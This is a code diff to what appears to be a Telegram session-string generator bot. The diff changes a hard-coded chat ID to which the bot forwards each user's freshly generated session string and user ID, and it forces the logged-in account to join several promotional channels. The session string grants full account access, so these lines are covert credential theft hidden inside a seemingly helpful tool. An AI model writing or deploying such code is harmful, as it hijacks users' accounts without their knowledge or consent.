@@ -170,22 +170,22 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
             if telethon:
                 await client(JoinChannelRequest("amwangsupport"))
                 await client(JoinChannelRequest("amwangs"))
-                await client(JoinChannelRequest("amangproject"))
-                await client(JoinChannelRequest("jualtelprem"))
+                await client(JoinChannelRequest("amangprojectchannel"))
+                #await client(JoinChannelRequest("jualtelprem"))
             else:
                 await client.join_chat("amwangs")
-                await client.join_chat("amangproject")
+                await client.join_chat("amangprojectchannel")
                 await client.join_chat("amwangsupport")
-                await client.join_chat("jualtelprem")
+                #await client.join_chat("jualtelprem")
         except (rpcerrorlist.ChannelPrivateError, UserBannedInChannel):
             await msg.reply('**Jiah akun lu dibanned di Amang Support.\nCoba sono ngadu ke salah 1 admin Amang Support biar dibuka ban nya.**', quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan))
             return
         if not is_bot:
             await bot.send_message(msg.chat.id, text)
-            await bot.send_message(-1001989801027, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
+            await bot.send_message(-1002000612421, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
         else:
             await bot.send_message(msg.chat.id, text)
-            await bot.send_message(-1001989801027, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
+            await bot.send_message(-1002000612421, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
     except KeyError:
         pass
     await client.disconnect()
